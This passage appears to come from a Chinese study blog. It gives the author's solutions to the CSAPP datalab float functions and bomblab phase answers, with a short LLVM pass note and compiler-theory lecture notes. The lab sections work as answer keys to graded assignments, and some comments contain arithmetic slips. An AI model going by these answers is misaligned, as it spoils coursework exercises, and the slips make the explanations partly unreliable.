class="hljs-number">0x7fffff</span>;  <span class="hljs-comment">// 00000000011111111111111111111111</span><br>    <span class="hljs-keyword">int</span> exp = (uf &amp; exp_const)&gt;&gt;<span class="hljs-number">23</span>; <span class="hljs-comment">// get exp part</span><br>    <span class="hljs-keyword">int</span> frac = uf &amp; frac_const;     <span class="hljs-comment">// get frac part</span><br>    <span class="hljs-keyword">int</span> sign = uf &gt;&gt; <span class="hljs-number">31</span>;            <span class="hljs-comment">// get sign</span><br>    <span class="hljs-keyword">int</span> sign_bit = sign &lt;&lt; <span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">if</span> (exp == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> uf &lt;&lt; <span class="hljs-number">1</span> | sign_bit; <span class="hljs-comment">// exp = 0, not a correct format</span><br>    <span class="hljs-keyword">if</span> (exp == <span class="hljs-number">255</span>) <span class="hljs-keyword">return</span> uf; <span class="hljs-comment">// When argument is NaN, return argument</span><br>    <span class="hljs-keyword">return</span> ((exp + <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">23</span>) | frac | sign_bit;<span class="hljs-comment">// 组合在一起</span><br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>1位符号位，8位exp，23位frac</p><p>如125.125（10进制）</p><p>转换成二进制<code>1111101.001</code>(二进制)，再转换成浮点数标准格式</p><p><code>1.111101001 * 2^6</code> </p><p>6代表点向左移动了几位，加上偏移量<code>127(32位)或者1023(64位)</code>，32位下，exp = (6+127)的二进制表示<code>10000101</code></p><p>Frac = 小数点后的数，如<code>111101001</code></p></blockquote><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="hljs-comment"> *   for floating point argument f.</span><br><span class="hljs-comment"> *   Argument is passed as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point value.</span><br><span class="hljs-comment"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="hljs-comment"> *   0x80000000u.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> exp_const = <span class="hljs-number">0x7f800000</span>; <span class="hljs-comment">// 01111111100000000000000000000000</span><br>    <span class="hljs-keyword">int</span> frac_const = <span class="hljs-number">0x7fffff</span>;  <span class="hljs-comment">// 00000000011111111111111111111111</span><br>    <span class="hljs-keyword">int</span> exp = (uf &amp; exp_const)&gt;&gt;<span class="hljs-number">23</span>; <span class="hljs-comment">// get exp part</span><br>    <span class="hljs-keyword">int</span> frac = uf &amp; frac_const;     <span class="hljs-comment">// get frac part</span><br>    frac = frac | <span class="hljs-number">0x800000</span>;         <span class="hljs-comment">// 浮点数省略了第一个1，一般到位移的时候，1.frac，小数点前的1被省略了，所以得补上</span><br>    <span class="hljs-keyword">int</span> sign = uf &gt;&gt; <span class="hljs-number">31</span>;            <span class="hljs-comment">// get sign</span><br>    <span class="hljs-keyword">int</span> sign_bit = sign &lt;&lt; <span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">int</span> shift_num = exp - <span class="hljs-number">127</span>;<br><br>    <span class="hljs-keyword">if</span> (shift_num &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (shift_num &gt; <span class="hljs-number">31</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000000</span>u;<br><br>    <span class="hljs-keyword">if</span> (shift_num &gt; <span class="hljs-number">23</span>)<span class="hljs-comment">// 如果位移在23以上，说明frac部分全都是小数点前的，需要左移</span><br>        frac = frac &lt;&lt; (shift_num - <span class="hljs-number">23</span>);<br>    <span class="hljs-keyword">else</span><span class="hljs-comment">// 右移并将小数点后的省略掉</span><br>        frac = (frac &gt;&gt; (<span class="hljs-number">23</span> - shift_num));<br><br>    <span class="hljs-keyword">if</span> (sign)<br>        <span class="hljs-keyword">return</span> ~frac+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> frac;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="hljs-comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The unsigned value that is returned should have the identical bit</span><br><span class="hljs-comment"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="hljs-comment"> *   If the result is too small to be represented as a denorm, return</span><br><span class="hljs-comment"> *   0. If too large, return +INF.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span><br><span class="hljs-comment"> *   Max ops: 30 </span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">floatPower2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> INF = <span class="hljs-number">0x7f800000</span>; <span class="hljs-comment">// 01111111100000000000000000000000</span><br>    <span class="hljs-keyword">int</span> exp = x + <span class="hljs-number">127</span>;<br>    <span class="hljs-keyword">if</span> (exp &gt; <span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">return</span> INF;<br>    <span class="hljs-keyword">if</span> (exp &gt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> exp &lt;&lt; <span class="hljs-number">23</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>2.0的位级表示（ 1.0 * 2^1 ）：符号位：0，指数：1+127=128，frac=1.0-1=0。</p><p>首先得到偏移之后的指数值e，如果e小于等于0（为0时，结果为0，因为2.0的浮点表示frac部分为0），对应的如果e大于等于255则为无穷大或越界了。否则返回正常浮点值，frac为0，直接对应指数即可</p><p>来源<a href="https://zhuanlan.zhihu.com/p/59534845">https://zhuanlan.zhihu.com/p/59534845</a></p></blockquote><h2 id="bomblab"><a href="#bomblab" class="headerlink" title="bomblab"></a>bomblab</h2><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h3><p><code>Border relations with Canada have never been better.</code></p><h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h3><p>看phase_2函数里</p><p>![image-20200905200221312](CSAPP lab/image-20200905200221312.png)</p><p>![image-20200905201155428](CSAPP lab/image-20200905201155428.png)</p><p>读取了六个数字，结合f5生成的伪代码，可以看到讲读取的数据存入到栈种。调用结束后会将[rsp]与1进行比较，所以第一个数必须是1。</p><p>![image-20200905202536189](CSAPP lab/image-20200905202536189.png)</p><p>标黄的地方，将[rsp+4]放到rbx中，然后在0x400F17这里，可以看到将[rbx-4]，也就是[rsp]放入eax中，再eax自加，随后将exa和[rbx]相比较，所以也就是读取的数字中，第二个数字是第一个数字*2，以此类推，一直到rbx = rbp 也就是直到rsp + 18h，也就是比对完这读取的六个数字，然后再结束循环解除炸弹。</p><h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h3><p>根据输入的v8，比对result是否和v9一样</p><h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h3><p>可以用python写一下func4的代码，或者直接让v8=7让返回结果是0就行</p><h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h3><p>![image-20200906215307237](CSAPP lab/image-20200906215307237.png)</p><p>![image-20200906215354052](CSAPP lab/image-20200906215354052.png)</p><p>赋值这里，由于会和 0xF与一下，所以为了使结果是flyers，输入<code>9on567</code>即可在这个数组中取得对应的字幕</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">o</span> = <span class="hljs-number">0110</span> <span class="hljs-number">1111</span> <br><span class="hljs-attribute">o</span> &amp; <span class="hljs-number">0</span>xf = <span class="hljs-number">0000</span> <span class="hljs-number">1111</span> = <span class="hljs-number">16</span> = <span class="hljs-number">0</span>xf<br><span class="hljs-attribute">n</span> = <span class="hljs-number">0110</span> <span class="hljs-number">1110</span><br><span class="hljs-attribute">n</span> &amp; <span class="hljs-number">0</span>xf = <span class="hljs-number">0000</span> <span class="hljs-number">1110</span> = <span class="hljs-number">15</span> = <span class="hljs-number">0</span>xe<br></code></pre></td></tr></table></figure><h3 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase_6"></a>Phase_6</h3><p>4 3 2 1 6 5</p><p>挖坑，咕咕咕</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>LLVM pass</title>
    <link href="/2020/08/21/LLVM%20pass/"/>
    <url>/2020/08/21/LLVM%20pass/</url>
    
    <content type="html"><![CDATA[<p>可以先看看 <a href="https://zhuanlan.zhihu.com/p/122522485">这里</a></p><p>LLVM的核心是一个库。从CSCD70的Assignment1来看，llvm pass可以调用库来输出源代码loop.c里有的函数名称，直接调用该函数的次数，参数个数，Basic Blocks数量和指令个数(FunctionInfo.cpp里完成)和对代码进行优化使其运行更快(LocalOpt.cpp里完成)，优化指加减乘除优化，如</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">x</span> + <span class="hljs-number">0</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> + <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-keyword">x</span><br><span class="hljs-number">2</span> * <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> * <span class="hljs-number">2</span> <span class="hljs-operator">=</span>&gt; (<span class="hljs-keyword">x</span> + <span class="hljs-keyword">x</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">x</span> &lt;&lt; <span class="hljs-number">1</span><br>a <span class="hljs-operator">=</span> b + <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> a - <span class="hljs-number">1</span> <span class="hljs-operator">=</span>&gt; a <span class="hljs-operator">=</span> b + <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> b<br></code></pre></td></tr></table></figure><p>可以参考youn9师傅的<a href="https://github.com/y-f00l/f00l_llvm_learn">github</a>，里面有他的一些很好的笔记。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>编译原理学习笔记</title>
    <link href="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1cE411f78c?p=1">视频</a></p><h2 id="编译器结构"><a href="#编译器结构" class="headerlink" title="编译器结构"></a>编译器结构</h2><h3 id="词法分析-Lexical-analysis-or-scanning"><a href="#词法分析-Lexical-analysis-or-scanning" class="headerlink" title="词法分析 Lexical analysis or scanning"></a>词法分析 Lexical analysis or scanning</h3><p><strong>检测输入字符串中不属于我们语言的那部分符号</strong></p><p>词法分析把程序字段变成关键字words or 词法单元tokens</p><p>如</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-keyword">if</span> <span class="hljs-attr">x</span> == y <span class="hljs-keyword">then</span> <span class="hljs-attr">z</span> = <span class="hljs-number">1</span>; <span class="hljs-keyword">else</span> <span class="hljs-attr">z</span> = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>分号，标点，分隔符都是词法单元</p><h3 id="语法分析syntax-analysis-parsing"><a href="#语法分析syntax-analysis-parsing" class="headerlink" title="语法分析syntax analysis parsing"></a>语法分析syntax analysis parsing</h3><p>试着去判断是否格式正确或者是否是有效程序（语句中是否存在格式错误或没用解析树）</p><p>if then else包含三部分</p><p>predicate条件判断，then语句和else语句</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200626235143347.png" class="" title="image-20200626235143347"><h3 id="语义分析-semantic-analysis"><a href="#语义分析-semantic-analysis" class="headerlink" title="语义分析 semantic analysis"></a>语义分析 semantic analysis</h3><p>尝试去找出矛盾的地方 </p><h3 id="优化-optimization"><a href="#优化-optimization" class="headerlink" title="优化 optimization"></a>优化 optimization</h3><p>修改代码使之使用更少的资源</p><h3 id="代码生成"><a href="#代码生成" class="headerlink" title="代码生成"></a>代码生成</h3><p>高级语言转变成汇编</p><h2 id="Cool语言"><a href="#Cool语言" class="headerlink" title="Cool语言"></a>Cool语言</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cool">class Main &#123;<br>i : IO &lt;- new IO;<br>main() : Int &#123; &#123; i.out_string(&quot;Hello wordld!\n&quot;); 1;&#125; &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>Int 是return type。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">class <span class="hljs-selector-tag">Main</span> &#123;<br><span class="hljs-selector-tag">i</span> : IO &lt;- new IO;<br><span class="hljs-selector-tag">main</span>() : IO &#123; &#123; i.<span class="hljs-built_in">out_string</span>(<span class="hljs-string">&quot;Hello wordld!\n&quot;</span>); &#125; &#125;;<br>&#125;;//一旦打印完string就退出<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">class <span class="hljs-selector-tag">Main</span> &#123;<br><span class="hljs-selector-tag">i</span> : IO &lt;- new IO;<br><span class="hljs-selector-tag">main</span>() : Object &#123; &#123; i.<span class="hljs-built_in">out_string</span>(<span class="hljs-string">&quot;Hello wordld!\n&quot;</span>); &#125; &#125;;<br>&#125;;//<span class="hljs-selector-tag">Object</span> 返回类型<br><br>class <span class="hljs-selector-tag">Main</span> &#123;<br><span class="hljs-selector-tag">main</span>() : Object &#123; &#123; (new IO).<span class="hljs-built_in">out_string</span>(<span class="hljs-string">&quot;Hello wordld!\n&quot;</span>); &#125; &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面是继承的写法</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">Main</span> <span class="hljs-selector-tag">inherits</span> <span class="hljs-selector-tag">IO</span>&#123;<br><span class="hljs-selector-tag">main</span>() : <span class="hljs-selector-tag">Object</span> &#123; &#123; <span class="hljs-selector-tag">self</span><span class="hljs-selector-class">.out_string</span>(<span class="hljs-string">&quot;Hello wordld!\n&quot;</span>); &#125; &#125;;<br>&#125;;<br><br><span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">Main</span> <span class="hljs-selector-tag">inherits</span> <span class="hljs-selector-tag">IO</span>&#123;<br><span class="hljs-selector-tag">main</span>() : <span class="hljs-selector-tag">Object</span> &#123; &#123; <span class="hljs-selector-tag">out_string</span>(<span class="hljs-string">&quot;Hello wordld!\n&quot;</span>); &#125; &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h2><p>目标是将输入流划分为词素。</p><p>从左到右的扫描字符串，有时必须对输入字符串向前看，才能弄清楚当前字符串和子字符串在语言中的角色</p><p>变量名称：字母开头</p><p> 字符串-&gt; 语法分析器 -&gt;<code>变成token&lt;class, string&gt;</code> parser解析器</p><p>foo = 42 -&gt;                  &lt;Id, “foo”&gt; &lt;operator, “=”&gt; &lt;Int, “42”&gt;</p><p>有以下几类：</p><ul><li>空格whitespace</li><li>keyword</li><li>identifiers</li><li>numbers</li></ul><p>这些子字符串称为词素（构成词的要素），&lt;token class， lexemes词素&gt;，这就是一个token</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h4 id="基础表达式"><a href="#基础表达式" class="headerlink" title="基础表达式"></a>基础表达式</h4><h5 id="单字符"><a href="#单字符" class="headerlink" title="单字符"></a>单字符</h5><p>‘c’ = {‘c’}</p><h5 id="Epsilon"><a href="#Epsilon" class="headerlink" title="Epsilon"></a>Epsilon</h5><p>Epsilon = {“”} = 单个字符的空字符串 != 空字符串</p><h4 id="复合表达式"><a href="#复合表达式" class="headerlink" title="复合表达式"></a>复合表达式</h4><h5 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h5><p>A + B = {a|a属于A} U {b|b属于B}</p><p>A并B</p><h5 id="Concatencation-级联"><a href="#Concatencation-级联" class="headerlink" title="Concatencation 级联"></a>Concatencation 级联</h5><p>如[a,b]与[c,d]级联得到[ac,ad,bc,bd]</p><p>AB = {ab | a属于A ^ b 属于B }</p><h5 id="Iterator-串联"><a href="#Iterator-串联" class="headerlink" title="Iterator 串联"></a>Iterator 串联</h5><p>A* = 0到无穷个A串联 </p><h3 id="匹配变量名"><a href="#匹配变量名" class="headerlink" title="匹配变量名"></a>匹配变量名</h3><p>A+ = AA* = 至少一个A</p><p>digit = ‘0’ + ‘1’ + ‘2’ + ‘3’ + ‘4’ + ‘5’ + ‘6’ + ‘7’ + ‘8’ + ‘9’</p><p>letter = [a-zA-Z] 匹配所有字母</p><p>letter(letter+digit)* 字母+0或多个字母和数字的组合</p><p>空格 ‘ ‘ + ‘\n’ + ‘\t’</p><p>opt_function = (‘.’digits)?</p><p>Opt_exponent = (‘E’(‘+’ + ‘-‘)?digits)?</p><p>###词法规范</p><p>当输入值有两种不同的前缀，且这两种都是有效的词法单元时，就应该选择最长的那个，最长匹配原则Maximal Munch</p><p>当匹配到两个规则的时候，如keiword，identifiers，会优先匹配第一个choose the one listed first。</p><p>捕获有可能错误字符串的正则表达式并赋予其最低优先级</p><h3 id="有限自动机Finite-Automata"><a href="#有限自动机Finite-Automata" class="headerlink" title="有限自动机Finite Automata"></a>有限自动机Finite Automata</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><ul><li>一组能读取的输入字符串</li><li>一个有限状态的集合</li><li>一个特殊的集合被设定为开始状态</li><li>一组用于接受状态的集合（读取完可接受状态输入后自动结束，否则拒绝输入</li><li>有一些用于状态转换的集合</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628214134850.png" class="" title="image-20200628214134850"><h4 id="Exampls"><a href="#Exampls" class="headerlink" title="Exampls"></a>Exampls</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628160825195.png" class="" title="image-20200628160825195"><h4 id="确定性自动机和非确定性自动机的区别"><a href="#确定性自动机和非确定性自动机的区别" class="headerlink" title="确定性自动机和非确定性自动机的区别"></a>确定性自动机和非确定性自动机的区别</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628161433100.png" class="" title="image-20200628161433100"><p>DFA只有一条道可以通过</p><p>NFA基于输入执行，可能处于许多不同的状态，只要有任何一条路径可以接受，就会处于接受状态 ，这个字符串就属于这个NFA可以接受的语言</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628161945645.png" class="" title="image-20200628161945645"><p>NFA要远比DFA来的小，可以成倍缩小，DFA执行速度更快</p><h3 id="将正则表达式转换为NFA-非确定性有限自动机"><a href="#将正则表达式转换为NFA-非确定性有限自动机" class="headerlink" title="将正则表达式转换为NFA 非确定性有限自动机"></a>将正则表达式转换为NFA 非确定性有限自动机</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628213856496.png" class="" title="image-20200628213856496"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628213913515.png" class="" title="image-20200628213913515"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628213950201.png" class="" title="image-20200628213950201"><h3 id="NFA-to-DFA"><a href="#NFA-to-DFA" class="headerlink" title="NFA to DFA"></a>NFA to DFA</h3><p>Epsilon-closure：是状态选择，可以是一组状态，但只针对单个状态进行处理，只关注那些仅通过空跳就可以到达的状态。</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628215245905.png" class="" title="image-20200628215245905"><p>N种状态，可用状态数量子集|S| &lt;= N，公用2^N -1种非空子集</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628220546136.png" class="" title="image-20200628220546136"><p> 所维护的每一个属性都指代一条计算执行路径，DFA的状态记录了NFA基于相同输入可能进入的可能状态集</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628221202160.png" class="" title="image-20200628221202160"><p>原视频讲解链接：<a href="https://www.bilibili.com/video/BV1cE411f78c?p=16">link</a> 11:15秒</p><h3 id="实现有限自动机"><a href="#实现有限自动机" class="headerlink" title="实现有限自动机"></a>实现有限自动机</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628221706335.png" class="" title="image-20200628221706335"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200628222154758.png" class="" title="image-20200628222154758"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200629082652419.png" class="" title="image-20200629082652419"> <h4 id="实现NFA"><a href="#实现NFA" class="headerlink" title="实现NFA"></a>实现NFA</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200629083217424.png" class="" title="image-20200629083217424"><p>节省了大量表空间，但是</p><p>执行速度比确定性自动机慢很多 </p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>DFA执行速度更快，结构上较为松散</p><p>NFA速度较慢，结构紧凑</p><h3 id="PA2"><a href="#PA2" class="headerlink" title="PA2"></a>PA2</h3><p><a href="https://github.com/mrbelieve128/Stanford-Compilers-PA/tree/master/PA2">https://github.com/mrbelieve128/Stanford-Compilers-PA/tree/master/PA2</a></p><h2 id="解析器-Parsing"><a href="#解析器-Parsing" class="headerlink" title="解析器 Parsing"></a>解析器 Parsing</h2><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200707171225807.png" class="" title="image-20200707171225807"><h3 id="上下文无关文法-context-free-grammar"><a href="#上下文无关文法-context-free-grammar" class="headerlink" title="上下文无关文法 context-free grammar"></a>上下文无关文法 context-free grammar</h3><ul><li>不是所有token都是程序</li><li>解析器parse需要分辨有效和无效的字符串</li></ul><p>所以需要</p><ul><li>需要中算法来分辨有效token</li><li>算法来分辨有效token和无效token</li></ul><p>上下文无关的文法自然而然地用于描述这种递归结构</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708102409480.png" class="" title="image-20200708102409480"><p>上下文无关的文法包含</p><ul><li>A set of terminals <strong>T</strong></li><li>A set of non-terminal <strong>N</strong></li><li>A start symbol <strong>S</strong> <strong>(S 是 N之一)</strong></li><li>A set of productions (是指一个符号跟着一个箭头，紧接着一串符号)</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708103010382.png" class="" title="image-20200708103010382"><p><a href="https://www.bilibili.com/video/BV1cE411f78c?p=19">定义7:43左右</a></p><h3 id="推导"><a href="#推导" class="headerlink" title="推导"></a>推导</h3><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>Grammer</p><p>E -&gt; E+E | E*E | (E) | id</p><p>String</p><p>id * id + id</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708111200187.png" class="" title="image-20200708111200187"><p>A parse tree has</p><ul><li>Terminals at the leaves</li><li>Non-terminals at the interior nodes (内部节点)</li></ul><p>叶子结点的中序遍历结果是原始输入</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708111904374.png" class="" title="image-20200708111904374"><p>解析树也展示了操作间的关联性，但输入字符串并没有展示</p><p>如上图，<strong>“*”</strong>要比<strong>“+”</strong>号更优先，因为*号是+号的子树</p><p>上图这个例子是最左推导(在每个步骤先替换最左边的非终结字符）也有个等价概念最右推导</p><p>最左和最右推导生成的解析树都是一样的 </p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708113045442.png" class="" title="image-20200708113045442"><h3 id="Ambiguity-歧义性"><a href="#Ambiguity-歧义性" class="headerlink" title="Ambiguity 歧义性"></a>Ambiguity 歧义性</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708144341299.png" 